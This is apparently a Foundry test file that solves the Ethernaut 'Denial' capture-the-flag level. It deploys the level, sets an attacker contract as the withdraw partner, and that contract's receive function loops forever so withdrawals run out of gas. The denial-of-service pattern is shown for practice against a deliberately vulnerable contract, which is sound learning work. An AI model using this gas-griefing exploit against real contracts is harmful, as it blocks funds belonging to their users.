// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Denial.sol";
import "src/levels/DenialFactory.sol";

contract TestDenial is BaseTest {
    Denial private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new DenialFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /**
         * CODE YOUR SETUP HERE
         */
        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = Denial(levelAddress);

        // Check that the contract is correctly setup
    }

    function exploitLevel() internal override {
        /**
         * CODE YOUR EXPLOIT HERE
         */

        // This is a deny of service problem, we have to reject any call to the withdraw function
        // We can do this by setting the exploit contract as the partner and then calling the withdraw function
        // The exploit contract will run an infite loop on the receive function, so the transaction will run out of gas

        vm.startPrank(player, player);

        // Deploy the exploit contract
        Exploit exploit = new Exploit();

        // Set exploit to be the partner
        level.setWithdrawPartner(address(exploit));

        vm.stopPrank();
    }
}

contract Exploit {
    receive() external payable {
        while (true) {}
    }
}
